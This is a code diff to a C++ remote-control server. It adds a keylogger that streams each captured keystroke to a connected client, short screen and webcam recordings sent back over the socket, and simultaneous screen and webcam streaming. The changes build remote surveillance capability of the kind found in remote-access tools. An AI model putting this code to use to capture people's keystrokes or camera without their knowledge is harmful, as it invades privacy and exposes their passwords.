@@ -11,6 +11,7 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <fstream>
 
 #include <chrono>
 #include <iostream>
@@ -19,7 +20,7 @@
 #include "api/monitor.hpp"
 #include "api/process.hpp"
 #include "api/webcam.hpp"
-#include "api/webcam.hpp"
+#include "api/keylogger.hpp"
 
 static const size_t BUFF_SIZE = 8 * 1024 * 1024;
 static const int BACKEND_HEADER_SIZE = 12;
@@ -262,6 +263,38 @@ void BackendServer::handleClient(int fd) {
         if (webcam_cam) { webcam_cam->close(); webcam_cam.reset(); }
     };
 
+    // Recording State
+    std::atomic<bool> screen_recording(false);
+    std::atomic<bool> webcam_recording(false);
+    std::ofstream screen_rec_file;
+    std::ofstream webcam_rec_file;
+    std::mutex rec_mu;
+
+    auto send_file = [&](const std::string& path, const std::string& filename, uint32_t cid, uint32_t bid) {
+        std::ifstream f(path, std::ios::binary | std::ios::ate);
+        if (!f) return;
+        std::streamsize size = f.tellg();
+        f.seekg(0, std::ios::beg);
+
+        std::vector<uint8_t> buffer(size);
+        if (f.read((char*)buffer.data(), size)) {
+            // Protocol: [0x03] [4B name len] [Name] [Content]
+            std::vector<uint8_t> packet;
+            uint32_t name_len = filename.length();
+            uint32_t net_name_len = htonl(name_len);
+
+            packet.push_back(0x03); // FILE_DOWNLOAD
+            packet.resize(1 + 4 + name_len + size);
+
+            memcpy(packet.data() + 1, &net_name_len, 4);
+            memcpy(packet.data() + 5, filename.data(), name_len);
+            memcpy(packet.data() + 5 + name_len, buffer.data(), size);
+
+            send_bytes(packet, cid, bid);
+            send_text("OK: Sent file " + filename, cid, bid);
+        }
+    };
+
     auto split_ws = [](const std::string& s) {
         std::istringstream iss(s);
         std::vector<std::string> out;
@@ -274,6 +307,46 @@ void BackendServer::handleClient(int fd) {
 
     using H = std::function<void(const std::vector<std::string>&, uint32_t, uint32_t)>;
     std::unordered_map<std::string, H> handlers;
+
+    handlers["record_screen_10s"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        if (screen_recording.exchange(true)) return (void)send_text("ERROR: Already recording screen", cid, bid);
+
+        {
+            std::lock_guard<std::mutex> lk(rec_mu);
+            screen_rec_file.open("screen.h264", std::ios::binary);
+        }
+        send_text("OK: Screen recording started (10s)", cid, bid);
+
+        std::thread([&, cid, bid]() {
+            std::this_thread::sleep_for(std::chrono::seconds(10));
+            screen_recording.store(false);
+            {
+                std::lock_guard<std::mutex> lk(rec_mu);
+                if (screen_rec_file.is_open()) screen_rec_file.close();
+            }
+            send_file("screen.h264", "screen_clip.h264", cid, bid);
+        }).detach();
+    };
+
+    handlers["record_webcam_10s"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        if (webcam_recording.exchange(true)) return (void)send_text("ERROR: Already recording webcam", cid, bid);
+
+        {
+            std::lock_guard<std::mutex> lk(rec_mu);
+            webcam_rec_file.open("webcam.h264", std::ios::binary);
+        }
+        send_text("OK: Webcam recording started (10s)", cid, bid);
+
+        std::thread([&, cid, bid]() {
+            std::this_thread::sleep_for(std::chrono::seconds(10));
+            webcam_recording.store(false);
+            {
+                std::lock_guard<std::mutex> lk(rec_mu);
+                if (webcam_rec_file.is_open()) webcam_rec_file.close();
+            }
+            send_file("webcam.h264", "webcam_clip.h264", cid, bid);
+        }).detach();
+    };
 
     handlers["start_monitor_stream"] = [&](const auto&, uint32_t cid, uint32_t bid) {
         if (screen_streaming.exchange(true)) return (void)send_text("ERROR: Already streaming", cid, bid);
@@ -293,7 +366,20 @@ void BackendServer::handleClient(int fd) {
             // Blocks here until callback returns false or stream ends
             monitor.stream_h264([&](const std::vector<uint8_t>& chunk) {
                 if (!alive.load() || !screen_streaming.load()) return false; // Stop stream
-                return send_bytes(chunk, cid, bid);
+
+                // Recording Hook
+                if (screen_recording.load()) {
+                    std::lock_guard<std::mutex> lk(rec_mu);
+                    if (screen_rec_file.is_open()) screen_rec_file.write((const char*)chunk.data(), chunk.size());
+                }
+
+                // Multiplexing: Prepend 0x01 (SCREEN_STREAM)
+                std::vector<uint8_t> packet;
+                packet.reserve(1 + chunk.size());
+                packet.push_back(0x01);
+                packet.insert(packet.end(), chunk.begin(), chunk.end());
+
+                return send_bytes(packet, cid, bid);
             });
 
             screen_streaming.store(false);
@@ -329,17 +415,15 @@ void BackendServer::handleClient(int fd) {
     handlers["start_webcam_stream"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
         if (webcam_streaming.exchange(true)) return (void)send_text("ERROR: Webcam already streaming", cid, bid);
 
-        // Stop screen stream if active (exclusive mode)
-        if (screen_streaming.load()) stop_screen();
+        // Allow simultaneous streams now that we have multiplexing
+        // if (screen_streaming.load()) stop_screen();
 
         int idx = (a.size() >= 2) ? to_int(a[1], webcam_index) : webcam_index;
         webcam_index = idx;
 
         stop_webcam();
-        webcam_cam = std::make_unique<Webcam>(webcam_index);
 
-        // We don't explicit open() because stream_h264 uses ffmpeg which handles it.
-        // But we can check if device node exists? For now just try stream.
+        // Ensure device availability logic...
 
         send_text("OK: Webcam streaming started", cid, bid);
         webcam_streaming.store(true);
@@ -349,7 +433,20 @@ void BackendServer::handleClient(int fd) {
 
             webcam_cam->stream_h264([&](const std::vector<uint8_t>& chunk) {
                 if (!alive.load() || !webcam_streaming.load()) return false;
-                return send_bytes(chunk, cid, bid);
+
+                // Recording Hook
+                if (webcam_recording.load()) {
+                    std::lock_guard<std::mutex> lk(rec_mu);
+                    if (webcam_rec_file.is_open()) webcam_rec_file.write((const char*)chunk.data(), chunk.size());
+                }
+
+                // Multiplexing: Prepend 0x02 (WEBCAM_STREAM)
+                std::vector<uint8_t> packet;
+                packet.reserve(1 + chunk.size());
+                packet.push_back(0x02);
+                packet.insert(packet.end(), chunk.begin(), chunk.end());
+
+                return send_bytes(packet, cid, bid);
             });
 
             webcam_streaming.store(false);
@@ -364,11 +461,19 @@ void BackendServer::handleClient(int fd) {
     };
 
     handlers["list_process"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        std::cout << "[Server] Received list_process command" << std::endl;
         std::ostringstream oss;
         Process::print_all(oss);
         auto out = oss.str();
-        if (out.empty()) send_text("ERROR: Failed to list processes", cid, bid);
-        else send_text(out, cid, bid);
+        std::cout << "[Server] Process list generated. Size: " << out.size() << " bytes" << std::endl;
+
+        if (out.empty()) {
+            std::cerr << "[Server] ERROR: Process list is empty!" << std::endl;
+            send_text("ERROR: Failed to list processes", cid, bid);
+        }
+        else {
+            send_text(out, cid, bid);
+        }
     };
 
     handlers["ping"] = [&](const auto&, uint32_t cid, uint32_t bid) { send_text("PONG", cid, bid); };
@@ -380,11 +485,57 @@ void BackendServer::handleClient(int fd) {
         if (pid <= 0) return (void)send_text("ERROR: Invalid PID", cid, bid);
 
         Process p(pid);
-        if (p.destroy() == 0) send_text("OK: Process killed " + std::to_string(pid), cid, bid);
-        else {
-            std::string err = "ERROR: Failed to kill process " + std::to_string(pid) + " (" + strerror(errno) + ")";
-            send_text(err, cid, bid);
+        int res = p.destroy();
+        if (res == 0) {
+            std::cout << "[Server] Successfully killed PID " << pid << std::endl;
+            send_text("OK: Process killed " + std::to_string(pid), cid, bid);
+        } else {
+            std::string err = strerror(errno);
+            std::cerr << "[Server] Failed to kill PID " << pid << ": " << err << std::endl;
+            send_text("ERROR: Failed to kill " + std::to_string(pid) + ": " + err, cid, bid);
         }
+    };
+
+    // Keylogger State
+    std::unique_ptr<Keylogger> keylogger;
+    std::thread keylog_thread;
+    std::atomic<bool> keylog_active(false);
+
+    handlers["start_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        std::cout << "[Server] Received start_keylog command from Client " << cid << std::endl; // TRACER LOG
+
+        if (keylog_active.load()) return (void)send_text("ERROR: Keylogger already running", cid, bid);
+
+        if (!keylogger) keylogger = std::make_unique<Keylogger>();
+
+        if (!keylogger->start()) {
+            std::cerr << "[Server] Failed to start keylogger: " << keylogger->get_last_error() << std::endl;
+            send_text("ERROR: Failed to start keylogger: " + keylogger->get_last_error(), cid, bid);
+            return;
+        }
+
+        keylog_active.store(true);
+        send_text("OK: Keylogger started", cid, bid);
+
+        keylog_thread = std::thread([&, cid, bid]() {
+            keylogger->run_capture([&](std::string key) {
+                if (!alive.load() || !keylog_active.load()) return;
+                // Batching could be better, but character-by-character for now
+                // Prefix with specific tag for frontend parsing
+                send_text("KEYLOG: " + key, cid, bid);
+            });
+            keylog_active.store(false);
+            send_text("INFO: Keylogger stopped", cid, bid);
+        });
+        keylog_thread.detach();
+    };
+
+    handlers["stop_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        if (!keylog_active.load()) return (void)send_text("ERROR: Keylogger not running", cid, bid);
+        if (keylogger) keylogger->stop();
+        keylog_active.store(false);
+        // Thread will exit when read() returns or run_capture checks running_
+        send_text("OK: Keylogger stop requested", cid, bid);
     };
 
     while (running_.load()) {
